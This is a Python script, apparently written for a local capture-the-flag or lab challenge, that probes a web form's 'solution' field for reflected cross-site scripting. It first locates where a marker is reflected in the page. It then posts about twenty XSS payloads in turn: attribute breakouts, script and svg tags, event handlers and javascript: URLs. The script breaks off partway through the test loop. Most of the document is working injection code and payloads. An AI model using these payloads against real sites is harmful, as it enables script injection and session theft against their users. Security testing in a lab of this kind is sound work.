import requests
import re

base_url = "http://127.0.0.1:33202"

print("="*80)
print("TESTING XSS PAYLOADS - Finding execution context")
print("="*80)

# Test payloads that might execute in different contexts
test_payloads = [
    # Event handlers that fire immediately
    '" onfocus="alert(document.domain)" autofocus="',
    '" onmouseover="alert(document.domain)">
"',
    '" onerror="alert(document.domain)">
"',
    # Break out of attribute context
    '"><script>alert(document.domain)</script>',
    '"><img src=x onerror=alert(document.domain)>',
    '"><svg/onload=alert(document.domain)>',
    # JavaScript URL
    'javascript:alert(document.domain)',
    # Data URI
    'data:text/html,<script>alert(document.domain)</script>',
    # Try to close the input and add a script
    '"><svg/onload=alert(document.domain)>',
    '"><!--<script>alert(document.domain)</script>-->',
    '<script>alert(document.domain)</script>',
    'alert(document.domain)',
    '<img src=x onerror=alert(document.domain)>',
    '<iframe src=javascript:alert(document.domain)>',
    '<object data=javascript:alert(document.domain)>',
    '<embed src=javascript:alert(document.domain)>',
    '<details open ontoggle=alert(document.domain)>',
    '<marquee onstart=alert(document.domain)>XSS',
    '<body onload=alert(document.domain)>',
    '<svg><script>alert(document.domain)</script>',
    '<math><mi/xlink:href="data:x,<script>alert(document.domain)</script>">',
]

# First, let's see the exact HTML structure with a marker
marker_payload = 'MARKER123'
data = {'solution': marker_payload}
try:
    response = requests.post(f"{base_url}/page", data=data, timeout=10)
    print(f"\n[*] Testing with marker payload: {marker_payload}")
    print(f"[*] Status: {response.status_code}")
    
    # Find where the marker appears
    pos = response.text.find(marker_payload)
    if pos != -1:
        print(f"\n[!] MARKER FOUND at position {pos}")
        start = max(0, pos - 200)
        end = min(len(response.text), pos + len(marker_payload) + 200)
        snippet = response.text[start:end]
        print(f"\nContext around marker:")
        print("="*80)
        print(snippet)
        print("="*80)
        
        # Check if it's inside an attribute
        before_marker = response.text[:pos]
        after_marker = response.text[pos+len(marker_payload):]
        
        print(f"\nCharacter before marker: '{before_marker[-1] if before_marker else 'START'}'")
        print(f"Character after marker: '{after_marker[0] if after_marker else 'END'}'")
        
        # Check for attribute context
        if 'value="' in before_marker[-50:]:
            print(f"\n[!] MARKER IS INSIDE A VALUE ATTRIBUTE!")
            print(f"This means we can break out with: \"><script>...")
        else:
            print(f"\n[!] Marker is not in value attribute, checking context...")
            
except requests.exceptions.RequestException as e:
    print(f"[!] Error with marker test: {e}")

# Now test actual XSS payloads
print(f"\n\n{'='*80}")
print("TESTING XSS PAYLOADS")
print("="*80)

for i, payload in enumerate(test_payloads, 1):
    print(f"\n{'-'*80}")
    print(f"Test {i}: {payload}")
    print(f"{'-'*80}")
    
    data = {'solution': payload}
    try:
        response = requests.post(f"{base_url}/page", data=data, timeout=10)
        print(f"Status: {response.status_code}")
        
        # Check if payload is reflected
        ref_pos = response.text.find(payload)
        if ref_pos != -1:
